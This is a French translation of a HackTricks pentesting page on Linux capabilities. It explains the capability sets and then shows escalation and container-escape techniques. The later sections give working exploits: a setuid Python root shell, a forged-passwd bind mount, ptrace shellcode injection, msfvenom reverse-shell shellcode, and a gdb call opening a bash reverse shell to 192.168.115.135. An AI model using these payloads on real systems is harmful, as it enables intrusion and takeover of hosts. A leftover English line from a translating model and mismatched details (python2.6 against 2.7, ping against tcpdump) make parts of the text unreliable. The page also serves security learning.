# Capacités Linux

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) est l'événement de cybersécurité le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **la mission de promouvoir la connaissance technique**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans toutes les disciplines.\\

{% embed url="https://www.rootedcon.com/" %}

## Pourquoi les capacités ?

Les capacités Linux **fournissent un sous-ensemble des privilèges root disponibles** à un processus. Cela divise effectivement les privilèges root en unités plus petites et distinctes. Chacune de ces unités peut ensuite être accordée indépendamment aux processus. De cette façon, l'ensemble complet des privilèges est réduit, diminuant les risques d'exploitation.

Pour mieux comprendre comment fonctionnent les capacités Linux, examinons d'abord le problème qu'elles tentent de résoudre.

Supposons que nous exécutons un processus en tant qu'utilisateur normal. Cela signifie que nous ne sommes pas privilégiés. Nous ne pouvons accéder qu'aux données qui nous appartiennent, à notre groupe ou qui sont marquées pour l'accès par tous les utilisateurs. À un moment donné, notre processus a besoin d'un peu plus de permissions pour remplir ses fonctions, comme ouvrir un socket réseau. Le problème est que les utilisateurs normaux ne peuvent pas ouvrir de socket, car cela nécessite des permissions root.

## Ensembles de capacités

**Capacités héritées**

**CapEff** : L'ensemble de capacités _effectives_ représente toutes les capacités que le processus utilise à l'instant (c'est l'ensemble réel de capacités que le noyau utilise pour les vérifications de permissions). Pour les capacités de fichier, l'ensemble effectif est en fait un seul bit indiquant si les capacités de l'ensemble autorisé seront déplacées vers l'ensemble effectif lors de l'exécution d'un binaire. Cela permet aux binaires qui ne sont pas conscients des capacités de tirer parti des capacités de fichier sans émettre d'appels système spéciaux.

**CapPrm** : (_Autorisé_) Il s'agit d'un sur-ensemble de capacités que le thread peut ajouter soit à l'ensemble autorisé du thread, soit à l'ensemble hérité du thread. Le thread peut utiliser l'appel système capset() pour gérer les capacités : il peut supprimer n'importe quelle capacité de n'importe quel ensemble, mais ne peut ajouter des capacités à ses ensembles effectif et hérité du thread que si elles sont dans son ensemble autorisé du thread. Par conséquent, il ne peut ajouter aucune capacité à son ensemble autorisé du thread, à moins qu'il n'ait la capacité cap\_setpcap dans son ensemble effectif du thread.

**CapInh** : En utilisant l'ensemble _hérité_, toutes les capacités qui sont autorisées à être héritées d'un processus parent peuvent être spécifiées. Cela empêche un processus de recevoir des capacités dont il n'a pas besoin. Cet ensemble est préservé à travers un `execve` et est généralement défini par un processus _recevant_ des capacités plutôt que par un processus qui distribue des capacités à ses enfants.

**CapBnd** : Avec l'ensemble _limitant_, il est possible de restreindre les capacités qu'un processus peut jamais recevoir. Seules les capacités présentes dans l'ensemble limitant seront autorisées dans les ensembles héritables et autorisés.

**CapAmb** : L'ensemble de capacités _ambiant_ s'applique à tous les binaires non-SUID sans capacités de fichier. Il préserve les capacités lors de l'appel à `execve`. Cependant, toutes les capacités de l'ensemble ambiant ne peuvent pas être préservées car elles sont supprimées si elles ne sont pas présentes dans l'ensemble héritable ou autorisé. Cet ensemble est préservé à travers les appels `execve`.

Pour une explication détaillée de la différence entre les capacités dans les threads et les fichiers et comment les capacités sont transmises aux threads, lisez les pages suivantes :

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Capacités des processus et des binaires

### Capacités des processus

Pour voir les capacités d'un processus particulier, utilisez le fichier **status** dans le répertoire /proc. Comme il fournit plus de détails, limitons-nous uniquement aux informations liées aux capacités Linux.\
Notez que pour tous les processus en cours d'exécution, les informations sur les capacités sont maintenues par thread, pour les binaires dans le système de fichiers, elles sont stockées dans des attributs étendus.

Vous pouvez trouver les capacités définies dans /usr/include/linux/capability.h

Vous pouvez trouver les capacités du processus actuel dans `cat /proc/self/status` ou en faisant `capsh --print` et celles d'autres utilisateurs dans `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
```markdown
Cette commande devrait retourner 5 lignes sur la plupart des systèmes.

* CapInh = Capacités héritées
* CapPrm = Capacités autorisées
* CapEff = Capacités effectives
* CapBnd = Ensemble limitatif
* CapAmb = Ensemble de capacités ambiantes
```
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Ces nombres hexadécimaux n'ont pas de sens. En utilisant l'utilitaire capsh, nous pouvons les décoder en noms de capacités.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Vérifions maintenant les **capacités** utilisées par `ping` :
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Bien que cela fonctionne, il existe une autre méthode plus simple. Pour voir les capacités d'un processus en cours d'exécution, utilisez simplement l'outil **getpcaps** suivi de son identifiant de processus (PID). Vous pouvez également fournir une liste d'identifiants de processus.
```bash
getpcaps 1234
```
Vérifions ici les capacités de `tcpdump` après avoir donné au binaire suffisamment de capacités (`cap_net_admin` et `cap_net_raw`) pour renifler le réseau (_tcpdump s'exécute dans le processus 9562_) :
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
### Capacités des Binaires

Les binaires peuvent avoir des capacités qui peuvent être utilisées lors de l'exécution. Par exemple, il est très courant de trouver le binaire `ping` avec la capacité `cap_net_raw` :
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Vous pouvez **rechercher des binaires avec des capacités** en utilisant :
```bash
getcap -r / 2>/dev/null
```
### Abandon des capacités avec capsh

Si nous abandonnons les capacités CAP\_NET\_RAW pour _ping_, alors l'utilitaire ping ne devrait plus fonctionner.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Outre la sortie de _capsh_ lui-même, la commande _tcpdump_ devrait également générer une erreur.

> /bin/bash : /usr/sbin/tcpdump : Opération non autorisée

L'erreur montre clairement que la commande ping n'est pas autorisée à ouvrir un socket ICMP. Nous savons maintenant avec certitude que cela fonctionne comme prévu.

### Supprimer les Capacités

Vous pouvez supprimer les capacités d'un binaire avec
```bash
setcap -r </path/to/binary>
```
## Capacités Utilisateur

Apparemment, **il est possible d'assigner des capacités également aux utilisateurs**. Cela signifie probablement que chaque processus exécuté par l'utilisateur pourra utiliser les capacités de l'utilisateur.\
Selon [ceci](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [cela](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) et [cela](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), quelques fichiers doivent être configurés pour donner certaines capacités à un utilisateur, mais celui qui assigne les capacités à chaque utilisateur sera `/etc/security/capability.conf`.\
Exemple de fichier :
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capacités de l'environnement

En compilant le programme suivant, il est possible de **lancer un shell bash dans un environnement qui fournit des capacités**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
Since the provided text appears to be a closing tag for a code block in markdown syntax and does not contain any English text to translate, there is nothing to translate. If you have any actual content that needs translation, please provide it, and I will assist you accordingly.
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
À l'intérieur du **bash exécuté par le binaire ambient compilé**, il est possible d'observer les **nouvelles capacités** (un utilisateur régulier n'aura aucune capacité dans la section "actuelle").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Vous pouvez **ajouter uniquement les capacités présentes** à la fois dans les ensembles de capacités permises et héritables.
{% endhint %}

### Binaires conscients des capacités / Binaires ignorants des capacités

Les **binaires conscients des capacités n'utiliseront pas les nouvelles capacités** données par l'environnement, cependant les **binaires ignorants des capacités les utiliseront** car ils ne les rejetteront pas. Cela rend les binaires ignorants des capacités vulnérables dans un environnement spécial qui accorde des capacités aux binaires.

## Capacités des services

Par défaut, un **service exécuté en tant que root se verra attribuer toutes les capacités**, et dans certains cas cela peut être dangereux.\
Par conséquent, un **fichier de configuration de service** permet de **spécifier** les **capacités** que vous souhaitez qu'il ait, **et** l'**utilisateur** qui devrait exécuter le service pour éviter d'exécuter un service avec des privilèges inutiles :
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capacités dans les conteneurs Docker

Par défaut, Docker attribue quelques capacités aux conteneurs. Il est très facile de vérifier quelles sont ces capacités en exécutant :
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) est l'événement de cybersécurité le plus pertinent en **Espagne** et l'un des plus importants en **Europe**. Avec **la mission de promouvoir la connaissance technique**, ce congrès est un point de rencontre bouillonnant pour les professionnels de la technologie et de la cybersécurité dans toutes les disciplines.

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Évasion de Conteneur

Les capacités sont utiles lorsque vous **souhaitez restreindre vos propres processus après avoir effectué des opérations privilégiées** (par exemple, après avoir configuré un chroot et lié à un socket). Cependant, elles peuvent être exploitées en leur passant des commandes ou des arguments malveillants qui sont ensuite exécutés en tant que root.

Vous pouvez forcer des capacités sur des programmes en utilisant `setcap`, et interroger ces dernières en utilisant `getcap` :
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
```markdown
Le `+ep` signifie que vous ajoutez la capacité (le "-" la retirerait) comme Effective et Permitted.

Pour identifier les programmes dans un système ou un dossier avec des capacités :
```
```bash
getcap -r / 2>/dev/null
```
### Exemple d'exploitation

Dans l'exemple suivant, le binaire `/usr/bin/python2.6` est trouvé vulnérable à l'élévation de privilèges :
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capacités** nécessaires par `tcpdump` pour **permettre à tout utilisateur d'analyser des paquets** :
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Le cas particulier des capacités "vides"

Notez qu'il est possible d'assigner des ensembles de capacités vides à un fichier de programme, et ainsi il est possible de créer un programme avec l'identifiant de l'utilisateur root qui change l'identifiant effectif et sauvegardé du processus qui exécute le programme à 0, mais ne confère aucune capacité à ce processus. En d'autres termes, si vous avez un binaire qui :

1. n'est pas possédé par root
2. n'a pas de bits `SUID`/`SGID` définis
3. a un ensemble de capacités vides (par exemple : `getcap myelf` retourne `myelf =ep`)

alors **ce binaire s'exécutera en tant que root**.

## CAP\_SYS\_ADMIN

[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) est en grande partie une capacité fourre-tout, elle peut facilement conduire à des capacités supplémentaires ou à un accès root complet (typiquement accès à toutes les capacités). `CAP_SYS_ADMIN` est nécessaire pour effectuer une gamme d'**opérations administratives**, ce qui est difficile à retirer des conteneurs si des opérations privilégiées sont effectuées à l'intérieur du conteneur. Conserver cette capacité est souvent nécessaire pour les conteneurs qui imitent des systèmes entiers par rapport aux conteneurs d'applications individuelles qui peuvent être plus restrictifs. Entre autres, cela permet de **monter des périphériques** ou d'abuser de **release\_agent** pour s'échapper du conteneur.

**Exemple avec binaire**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
En utilisant python, vous pouvez monter un fichier _passwd_ modifié par-dessus le vrai fichier _passwd_ :
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Et finalement, **montez** le fichier `passwd` modifié sur `/etc/passwd` :
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Et vous pourrez **`su` en tant que root** en utilisant le mot de passe "password".

**Exemple avec environnement (Docker breakout)**

Vous pouvez vérifier les capacités activées à l'intérieur du conteneur docker en utilisant :
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Dans la sortie précédente, vous pouvez voir que la capacité SYS\_ADMIN est activée.

* **Mount**

Cela permet au conteneur docker de **monter le disque hôte et d'y accéder librement** :
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Accès complet**

Dans la méthode précédente, nous avons réussi à accéder au disque de l'hôte docker.\
Si vous constatez que l'hôte exécute un serveur **ssh**, vous pourriez **créer un utilisateur sur le disque de l'hôte docker** et y accéder via SSH :
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**Cela signifie que vous pouvez vous échapper du conteneur en injectant un shellcode dans un processus en cours d'exécution sur l'hôte.** Pour accéder aux processus en cours d'exécution sur l'hôte, le conteneur doit être exécuté au moins avec **`--pid=host`**.

[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet d'utiliser `ptrace(2)` et les appels système récemment introduits pour l'attachement de mémoire croisée tels que `process_vm_readv(2)` et `process_vm_writev(2)`. Si cette capacité est accordée et que l'appel système `ptrace(2)` lui-même n'est pas bloqué par un filtre seccomp, cela permettra à un attaquant de contourner d'autres restrictions seccomp, voir [PoC pour contourner seccomp si ptrace est autorisé](https://gist.github.com/thejh/8346f47e359adecd1d53) ou le **PoC suivant** :

**Exemple avec binaire (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Exemple avec le binaire (gdb)**

`gdb` avec la capacité `ptrace` :
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Créez un shellcode avec msfvenom pour injecter en mémoire via gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Déboguez un processus root avec gdb et copiez-collez les lignes gdb précédemment générées :
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Exemple avec environnement (Docker breakout) - Un autre abus de GDB**

Si **GDB** est installé (ou vous pouvez l'installer avec `apk add gdb` ou `apt install gdb` par exemple), vous pouvez **déboguer un processus depuis l'hôte** et le faire appeler la fonction `system`. (Cette technique nécessite également la capacité `SYS_ADMIN`).
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Vous ne pourrez pas voir le résultat de la commande exécutée, mais elle sera exécutée par ce processus (donc obtenez un rev shell).

{% hint style="warning" %}
Si vous recevez l'erreur "No symbol "system" in current context.", vérifiez l'exemple précédent qui charge un shellcode dans un programme via gdb.
{% endhint %}

**Exemple avec environnement (Docker breakout) - Injection de Shellcode**

Vous pouvez vérifier les capacités activées à l'intérieur du conteneur docker en utilisant :
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Listez les **processus** en cours d'exécution sur l'**hôte** `ps -eaf`

1. Obtenez l'**architecture** `uname -m`
2. Trouvez un **shellcode** pour l'architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Trouvez un **programme** pour **injecter** le **shellcode** dans la mémoire d'un processus ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modifiez** le **shellcode** dans le programme et **compilez**-le `gcc inject.c -o inject`
5. **Injectez**-le et récupérez votre **shell** : `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

[**CAP_SYS_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permet au processus de charger et décharger des modules du noyau arbitraires (`init_module(2)`, `finit_module(2)` et `delete_module(2)` appels système). Cela pourrait conduire à une élévation de privilèges triviale et à une compromission de l'anneau 0. Le noyau peut être modifié à volonté, subvertissant toute la sécurité du système, les modules de sécurité Linux et les systèmes de conteneurs.\
